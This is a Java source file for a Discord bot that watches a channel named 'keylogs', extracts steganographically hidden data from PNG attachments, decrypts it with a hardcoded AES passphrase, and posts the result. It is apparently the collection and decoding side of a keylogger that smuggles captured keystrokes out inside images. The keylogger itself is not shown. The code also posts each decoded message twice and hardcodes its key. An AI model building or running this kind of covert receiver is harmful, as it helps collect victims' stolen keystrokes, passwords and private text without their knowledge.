package ge.edu.sangu;

import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.entities.*;
import net.dv8tion.jda.api.entities.channel.unions.MessageChannelUnion;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.requests.GatewayIntent;
import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;

import javax.crypto.SecretKey;
import java.io.File;
import java.io.InputStream;
import java.nio.file.Files;
import java.util.concurrent.CompletableFuture;

public class DecoderBot extends ListenerAdapter {

    public static void main(String[] args) {
        String token = System.getenv("DISCORD_BOT_TOKEN");

        try {
            JDABuilder.createDefault(token)
                    .enableIntents(
                            GatewayIntent.MESSAGE_CONTENT,
                            GatewayIntent.GUILD_MESSAGES
                    )
                    .addEventListeners(new DecoderBot())
                    .build();
            System.out.println("Bot connected successfully.");
        } catch (Exception e) {
            System.err.println("Error starting bot: " + e.getMessage());
            e.printStackTrace();
        }
    }

    @Override
    public void onMessageReceived(MessageReceivedEvent event) {
        //if (event.getAuthor().isBot()) return;
        if (!event.getChannel().getName().equalsIgnoreCase("keylogs")) return;

        TextChannel textChannel = (TextChannel) event.getChannel();
        String content = event.getMessage().getContentRaw();
        
        //test wach online
        if (content.equalsIgnoreCase("!ping")) {
            textChannel.sendMessage("Pong! I'm working in #" + textChannel.getName()).queue();
            return;
        }

        for (Message.Attachment attachment : event.getMessage().getAttachments()) {
            System.out.println("DEBUG - Found attachment: " + attachment.getFileName());
            if (attachment.isImage() && attachment.getFileName().toLowerCase().endsWith(".png")) {
                processImageAttachment(attachment, event.getChannel());
            }
        }
    }

    private void processImageAttachment(Message.Attachment attachment, MessageChannelUnion channel) {
        try {
            File tempImage = new File("received.png");
            CompletableFuture<InputStream> future = attachment.getProxy().download();
            InputStream is = future.get();
            Files.copy(is, tempImage.toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);

            String encrypted = ImageSteganography.extractMessage(tempImage.getAbsolutePath());
            System.out.println("DEBUG - Encrypted message extracted: " + encrypted);

            if (encrypted == null || encrypted.isBlank()) {
                channel.sendMessage("No hidden message found in the image.").queue();
                tempImage.delete();
                return;
            }

            SecretKey key = AESUtil.generateKey("secretpassphrase");
            String decrypted = AESUtil.decrypt(encrypted, key);
            System.out.println("DEBUG - Decrypted message: " + decrypted);

            channel.sendMessage("**Decoded message:**\n```\n" + decrypted + "\n```").queue();


            if (decrypted  == null || decrypted .isBlank()) {
                channel.sendMessage("No hidden message found in the image.").queue();
            } else {
                channel.sendMessage("**Decoded message:**\n```\n" + decrypted  + "\n```").queue();
            }

            tempImage.delete();
        } catch (Exception e) {
            channel.sendMessage("Failed to decode image: " + e.getMessage()).queue();
            e.printStackTrace();
        }
    }
}
